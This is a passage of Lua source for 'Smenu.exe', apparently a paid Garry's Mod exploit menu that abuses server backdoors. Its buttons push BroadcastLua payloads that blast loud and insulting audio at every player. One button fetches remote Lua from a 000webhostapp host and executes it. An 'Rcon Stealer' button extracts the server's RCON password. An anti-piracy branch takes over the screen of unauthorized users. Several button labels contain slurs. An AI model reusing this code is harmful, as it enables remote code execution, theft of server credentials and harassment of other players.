surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"https://loadingscrren.000webhostapp.com/68o4.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Earrape - Gucci Gang But Im Screaming" )
    SploitNotify("Earrape - Gucci Gang But Im Screaming")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 15, 540 )
        Macro:SetParent(Musiques)
        Macro:SetText( "STOP ALL SOUND" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 450, 30 )
Macro.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if Macro:IsHovered() then
Macro:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
Macro:SetTextColor( Color(  255, 255, 255 ) )        
end
Macro.DoClick = function()
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Song Stop" )
    SploitNotify("Song Stop")
    surface.PlaySound("buttons/blip1.wav") 
RunConsoleCommand( "stopsound" ) -- What happens when you press the button
end
end

------------------------------------------

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 70 )
        Macro:SetParent(Options)
        Macro:SetText( ".ExploitCity." )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
Macro.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if Macro:IsHovered() then
Macro:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 255, 255, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
Macro:SetTextColor( Color(  255, 255, 255 ) )        
end
Macro.DoClick = function()
net.WriteString( http.Fetch("https://loadingscrren.000webhostapp.com/ExploitCity.lua", function(b) RunString(b) end) )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Amuse toi bien !" )
    SploitNotify("Appuyé sur [?] Pour Activer le menu")
    surface.PlaySound("buttons/blip1.wav") 
end
end


-----------------------------------------------------   

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 630, 70 )
        Macro:SetParent(Options)
        Macro:SetText( "?" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 29, 29 )
        Macro.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if Macro:IsHovered() then
Macro:SetTextColor( Color( 255, 255, 255 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 117, 117, 150))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 0, 0, 0 ))
Macro:SetTextColor( Color( 255, 255, 255 ) )       
end
Macro.DoClick = function()
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "ExploitCity Ouvert" )
    SploitNotify("ExploitCity Injectées avec succées")
    surface.PlaySound("buttons/blip1.wav") 
RunConsoleCommand( "exploits_open" ) -- What happens when you press the button
end
end


----SOUNDBOARD

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Musiques)
Macro:SetPos( 140, 30 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - Karim" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristofficiel.fr/gmod/upload/KARIM.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Musique - Karim activé" )
    SploitNotify("Musique - KARIM")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Musiques)
Macro:SetPos( 140, 60 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - AHHHHHH" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"https://loadingscrren.000webhostapp.com/HAAAAAAA.mp3\", \"mono\", function()end )]])") 
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Soundboard - AHHHHHH activé" )
    SploitNotify("Soundboard - AHHHHHH ")
    surface.PlaySound("buttons/blip1.wav") 
end


local Macro = vgui.Create( "DButton" )
Macro:SetParent(Musiques)
Macro:SetPos( 140, 90 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - Code avec le cul" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristofficiel.fr/gmod/upload/code.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Soundboard - Code avec le cul activé" )
    SploitNotify("Soundboard - JE CODE AVEC LE CUL ")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Musiques)
Macro:SetPos( 140, 120 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - Supremacist insulte" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://zilnix.mtxserv.fr/soundboard/suprem.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Soundboard - Supremacist insulte" )
    SploitNotify("Soundboard - Supremacist insulte ")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Musiques)
Macro:SetPos( 140, 120 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - LA PHOTO FILS DE PUTE !!!" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://hackerrpforum.mtxserv.fr/TousLesSounds/Sound5/LA%20PHOTO%20FILS%20DE%20PUTE%20,%20LA%20PHOTO%20!!%20(%2018-25%20Vocaroo).mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Soundboard - Supremacist insulte" )
    SploitNotify("Soundboard - Supremacist insulte ")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Musiques)
Macro:SetPos( 140, 150 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - CACACACAAA" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"https://musicdeouff.000webhostapp.com/Compo%20Perso.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Soundboard - CACAAAAA" )
    SploitNotify("Soundboard - CACAAAAA ")
    surface.PlaySound("buttons/blip1.wav") 
end

----TK78
local Macro = vgui.Create( "DButton" )
Macro:SetParent(Musiques)
Macro:SetPos( 260, 30 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - WALLAH" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"https://musicdeouff.000webhostapp.com/Sound%20TK78/Wallah.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Musiques)
Macro:SetPos( 260, 60 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - zehmah" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"https://musicdeouff.000webhostapp.com/Sound%20TK78/Zehma.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Musiques)
Macro:SetPos( 260, 90 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - mongole" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"https://musicdeouff.000webhostapp.com/Sound%20TK78/bruit%20de%20gogole.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Musiques)
Macro:SetPos( 260, 120 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - mon reup" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"https://musicdeouff.000webhostapp.com/Sound%20TK78/mon%20rep%20se%20pose%20des%20questions.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Musiques)
Macro:SetPos( 260, 150 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - musique 1" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"https://musicdeouff.000webhostapp.com/Sound%20TK78/musique%201.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Musiques)
Macro:SetPos( 260, 180 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - musique 2" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"https://musicdeouff.000webhostapp.com/Sound%20TK78/musique%202.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Musiques)
Macro:SetPos( 260, 210 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - Sa marche pas" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"https://musicdeouff.000webhostapp.com/Sound%20TK78/sa%20Marche%20Pas.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Soundboard - Sa marche pas" )
    SploitNotify("Soundboard - Sa marche pas ")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Musiques)
Macro:SetPos( 260, 240 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - Anglais" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"https://musicdeouff.000webhostapp.com/Sound%20TK78/Anglais.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Soundboard - Anglais" )
    SploitNotify("Soundboard - Anglais")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Musiques)
Macro:SetPos( 260, 270 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - Aujourd'hui jles juré" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"https://musicdeouff.000webhostapp.com/Sound%20TK78/Aujourd'hui%20J'ai%20Jur.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Soundboard - Aujourd'hui jles juré" )
    SploitNotify("Soundboard - Aujourd'hui jles juré")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Musiques)
Macro:SetPos( 260, 300 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - Et mon compte twitter" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"https://musicdeouff.000webhostapp.com/Sound%20TK78/Compte%20Twitter.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Soundboard - Et mon compte twitter" )
    SploitNotify("Soundboard - Et mon compte twitter")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Musiques)
Macro:SetPos( 260, 330 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - Coup de coude" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"https://musicdeouff.000webhostapp.com/Sound%20TK78/Coup%20De%20Coude.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Soundboard - Coup de coude" )
    SploitNotify("Soundboard - Coup de coude")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Musiques)
Macro:SetPos( 260, 360 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - FDP 2" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"https://musicdeouff.000webhostapp.com/Sound%20TK78/Fils%20De%20Pute%202.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Soundboard - Coup de coude" )
    SploitNotify("Soundboard - Coup de coude")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Musiques)
Macro:SetPos( 260, 390 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - Dino" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"https://musicdeouff.000webhostapp.com/Sound%20TK78/Dinosaure.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Soundboard - Dino" )
    SploitNotify("Soundboard - Dino")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Musiques)
Macro:SetPos( 140, 180 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Soundboard - Supremacist" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://zilnix.mtxserv.fr/soundboard/suprem.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

-----------------------------------------------------   


-----------------------------------------------------

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 130 )
        Macro:SetParent(Controller)
        Macro:SetText( "Rcon Stealer" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
Macro.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if Macro:IsHovered() then
Macro:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(110, 241, 110, 110))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
Macro:SetTextColor( Color(  255, 255, 255 ) )        
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( rcon )
net.WriteBit (1)
net.SendToServer()
timer.Simple( 0.5, function()
if ValidNetString( "jeveuttonrconleul" ) then
net.Start("jeveuttonrconleul")
net.SendToServer()
else
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Rcon password non-trouvé, veuillez réessayer." )
end
end)
net.Receive( "rcon_passw_dump", function()
local rcon_pass = net.ReadString()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), rcon_pass, Color(0, 255, 0)," Rcon Password trouvé!")
end )
net.Receive( "aucun_rcon_ici", function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Aucun rcon ici" )
end )
end 
end


------------------------------
--     OPEN SMENU.EXE      --
------------------------------
surface.PlaySound("buttons/blip1.wav")
SploitNotify("Bienvenue sur le Smenu.exe " .. ply:GetName())

---------------------------------
end
concommand.Add("smenu.exe", Smenu)
concommand.Add("smenu_scanbd", checkbackdoors)
----------------------------------

else -- if steamid isn't authorized

surface.CreateFont( "PopupHFont", {
    font = "Segoe UI Light",
    size = 50,
    weight = 1000,
})

surface.CreateFont("PopupFont", {
    font = "Segoe UI Light",
    size = 21,
    weight = 300
})



concommand.Add("fucked", function()
    local Popup = vgui.Create("DFrame")
        Popup:SetSize( ScrW(), ScrH() )
        Popup:SetPos( 0,0 )
        Popup:SetVisible( true )
        Popup:SetDraggable( false )
        Popup:SetTitle( "" )
        Popup:MakePopup()
        Popup:ShowCloseButton( false )
        Popup.Paint = function(s,w,h) 
        surface.SetDrawColor( Color(0,0,0,200) ) 
        surface.DrawRect( 0,0, w,h ) 
        surface.SetDrawColor( Color(240,0,0) )
        surface.DrawRect( 0, w/2-Popup:GetTall()/1.520, ScrW(), ScrH()/6.5 )
        surface.SetTextColor(255,255,255) 
        surface.SetTextPos(w/5.10, h/2.40)
            surface.SetFont("PopupHFont")
            surface.SetTextPos(w/5.10, h/3)
            surface.DrawText("Error")
            surface.SetFont("PopupFont") 
            surface.SetTextPos(w/5.10, h/2.50)
            surface.DrawText( "You did not buy Smenu.exe," )
            surface.SetTextPos(w/5.10, h/2.40)              
            surface.DrawText( "And you can not use it," )
            surface.SetTextPos(w/5.10, h/2.30)
            surface.DrawText("I leave you with your screen like this :^).")
    end 
    button = vgui.Create("DButton", Popup)
    button:SetSize(110,32.5)
    button:SetPos(Popup:GetWide()/2+Popup:GetWide()/10, Popup:GetTall()/2.050)
    button:SetText("")
    button.Paint = function(s,w,h) 
        surface.SetDrawColor( Color(255,255,255) ) 
        surface.DrawRect( 0,0, w,h ) 
        surface.SetDrawColor( Color(80,180,240) ) 
        surface.DrawRect( 0+3,0+3, w-6,h-6 ) 
        surface.SetTextColor(255,255,255) 
        surface.SetFont("PopupFont") 
        surface.SetTextPos(24,5.5) 
        surface.DrawText( "Close" ) 
    end 
    button.DoClick = function(s,w,h) 
	  surface.PlaySound( "buttons/combine_button1.wav" )
        Popup:Close()
    end
	
end) 
RunConsoleCommand("fucked")
RunConsoleCommand("repare_menu", leak )
RunConsoleCommand( "sdbhfbgf", noob )
end

--[[---------------------------------------------------------------------------------------------------------
  ____  _                       _     _      _         _   _                _          _   _             
 / ___|| |_ ___  __ _ _ __ ___ (_) __| |    / \  _   _| |_| |__   ___  _ __(_)______ _| |_(_) ___  _ __  
 \___ \| __/ _ \/ _` | '_ ` _ \| |/ _` |   / _ \| | | | __| '_ \ / _ \| '__| |_  / _` | __| |/ _ \| '_ \ 
  ___) | ||  __/ (_| | | | | | | | (_| |  / ___ \ |_| | |_| | | | (_) | |  | |/ / (_| | |_| | (_) | | | |
 |____/ \__\___|\__,_|_| |_| |_|_|\__,_| /_/   \_\__,_|\__|_| |_|\___/|_|  |_/___\__,_|\__|_|\___/|_| |_|
                                                                                                         
   ----------------------------------------------------------------------------------------------------------]]
   
function leak()
fuck = false
timer.Create("LolHackers", 1, 0, function()
	if fuck then
		chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Did not pay - the menu did not get" )
		else
		chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), ":^)" )
	end
	fuck = !fuck
end)

LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Damn the pirate, go!" )
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Did not pay - the menu did not get!" )
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), ":^)" )
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "OMG UR LEAKER ???? LEL UR FUCKED !" )
local msg = "wait?! . . ."
surface.CreateFont("lolwutbet2", {size=75})
local function huddrawdetour2()
	draw.RoundedBox(0, 0, 0, ScrW(), ScrH(), HSVToColor( CurTime() % 6 * 60, 1, 1 ))
	draw.RoundedBox(0, 0, ScrH() / 3.5, ScrW(), ScrH() / 4.5, Color(0, 0, 0))
